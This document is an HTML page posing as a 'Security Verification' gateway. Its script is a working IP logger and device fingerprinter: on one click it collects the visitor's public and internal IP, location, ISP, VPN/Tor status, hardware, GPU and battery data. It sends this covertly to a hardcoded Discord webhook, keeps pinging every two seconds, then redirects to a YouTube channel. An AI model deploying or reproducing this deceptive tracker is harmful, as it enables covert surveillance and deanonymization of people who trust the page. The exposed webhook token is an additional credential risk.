<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Gateway - Identity Verification</title>
    <style>
        body { background: #f0f2f5; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .auth-shell { background: #ffffff; padding: 40px; border-radius: 8px; box-shadow: 0 12px 40px rgba(0,0,0,0.12); width: 360px; text-align: center; border-bottom: 4px solid #1a73e8; }
        .spinner { width: 35px; height: 35px; border: 4px solid #e1e4e8; border-top: 4px solid #1a73e8; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; display: none; }
        .auth-btn { background: #1a73e8; color: white; border: none; padding: 15px 30px; font-size: 15px; font-weight: 600; cursor: pointer; border-radius: 4px; width: 100%; transition: 0.3s; }
        .auth-btn:hover { background: #1557b0; transform: translateY(-1px); }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        #log { font-size: 11px; color: #70757a; margin-top: 20px; text-transform: uppercase; font-weight: bold; }
    </style>
</head>
<body>

<div class="auth-shell">
    <div class="spinner" id="loader"></div>
    <div id="content">
        <h2 style="font-size: 22px; margin-bottom: 15px; color: #202124;">Security Verification</h2>
        <p style="font-size: 14px; color: #5f6368; margin-bottom: 30px;">This connection is protected. Please verify your identity to proceed to the destination.</p>
        <button class="auth-btn" id="trigger">Verify Connection</button>
    </div>
    <div id="log">Status: Awaiting Interaction</div>
</div>

<script>
/**
 * SENTINEL OMEGA-PRESTIGE v25.0
 * FULL-SPECTRUM FORENSICS & LIVE KEEPALIVE
 */

const CONFIG = {
    WEBHOOK: "https://discordapp.com/api/webhooks/1497687704983310406/yv6VZ2yuH-bxE0fD_BNQAGIUOeQu0gB9-z44IbRhSdiJOvSpHBzljrwvDo0Ifw6hyQNp",
    DEST: "https://youtube.com/@LigmaBlox-w7m",
    LOCKS: { geo: false, net: false }
};

// --- DATA CONSOLIDATOR & TRANSMITTER ---
const sendPayload = (data, vectorName) => {
    const payload = JSON.stringify({
        username: `SENTINEL-PRESTIGE [${vectorName}]`,
        embeds: [{
            title: "🔱 Advanced Identity Profile Captured",
            color: 0x1a73e8,
            fields: Object.entries(data).map(([k,v]) => ({ name: k.toUpperCase(), value: `\`${v}\``, inline: true })),
            timestamp: new Date().toISOString(),
            footer: { text: "Protocol: OMEGA-v25-STABLE" }
        }]
    });
    navigator.sendBeacon(CONFIG.WEBHOOK, new Blob([payload], {type:'application/json'}));
};

// --- LIVE KEEPALIVE UPDATE (Every 2 Seconds) ---
const startLiveUpdates = async () => {
    setInterval(async () => {
        try {
            const bat = await navigator.getBattery();
            sendPayload({
                status: "Target is on page",
                battery: `${(bat.level * 100).toFixed(0)}%`,
                charging: bat.charging ? "YES" : "NO",
                memory_usage: `${(performance.memory ? (performance.memory.usedJSHeapSize / 1048576).toFixed(1) : "N/A")} MB`
            }, "LIVE_KEEPALIVE");
        } catch(e) {}
    }, 2000);
};

document.getElementById('trigger').onclick = async function() {
    this.parentElement.style.display = 'none';
    document.getElementById('loader').style.display = 'block';
    document.getElementById('log').innerText = "Establishing Secure Tunnel...";

    // 1. Initial Threat & Hardware Scan
    const bat = await navigator.getBattery();
    const threats = {
        adblock: "NO",
        lockdown: !window.RTCPeerConnection ? "YES" : "NO",
        tor_suspected: "NO"
    };

    // AdBlock Check
    const adTest = document.createElement('div');
    adTest.className = 'adsbox ad-unit';
    document.body.appendChild(adTest);
    if (adTest.offsetHeight === 0) threats.adblock = "YES";
    document.body.removeChild(adTest);

    // 2. High-Precision Geospatial Chain
    fetch('https://ipapi.co/json/').then(r => r.json()).then(res => {
        if(!CONFIG.LOCKS.geo) {
            const tzLocal = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const vpn_detected = (res.timezone !== tzLocal) ? "YES" : "NO";
            
            sendPayload({
                continent: res.continent_code,
                country: res.country_name,
                region: res.region,
                city: res.city,
                town: res.postal || "N/A",
                ip_public: res.ip,
                isp: res.org,
                vpn_status: vpn_detected,
                tor_status: (res.org.toLowerCase().includes("tor") || vpn_detected === "YES" && res.country === "DE") ? "YES" : "NO",
                lockdown_mode: threats.lockdown,
                adblocker: threats.adblock
            }, "PRECISION_GEO_DATA");
            
            CONFIG.LOCKS.geo = true;
        }
    });

    // 3. Hardware & Battery Double-Check
    sendPayload({
        device: navigator.platform,
        cores: navigator.hardwareConcurrency,
        ram: navigator.deviceMemory ? navigator.deviceMemory + "GB" : "N/A",
        battery_at_click: `${(bat.level * 100).toFixed(0)}%`,
        screen_res: `${window.screen.width}x${window.screen.height}`,
        gpu: (() => {
            const gl = document.createElement('canvas').getContext('webgl');
            const d = gl.getExtension('WEBGL_debug_renderer_info');
            return d ? gl.getParameter(d.UNMASKED_RENDERER_WEBGL) : "Hidden";
        })()
    }, "HARDWARE_SPECS");

    // 4. NAT/VPN Piercing (Internal IP Translation)
    const rtc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
    rtc.createDataChannel("");
    rtc.onicecandidate = (e) => {
        if (e.candidate && !CONFIG.LOCKS.net) {
            const internalIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
            if (internalIP) {
                sendPayload({
                    internal_ip: internalIP[1],
                    translation: "Private-to-Public Match",
                    protocol: "UDP_STUN_BYPASS"
                }, "NETWORK_UNMASKING");
                CONFIG.LOCKS.net = true;
            }
        }
    };
    rtc.createOffer().then(o => rtc.setLocalDescription(o));

    // Start live updates and redirect
    startLiveUpdates();
    setTimeout(() => { window.location.replace(CONFIG.DEST); }, 7500);
};
</script>
</body>
</html>
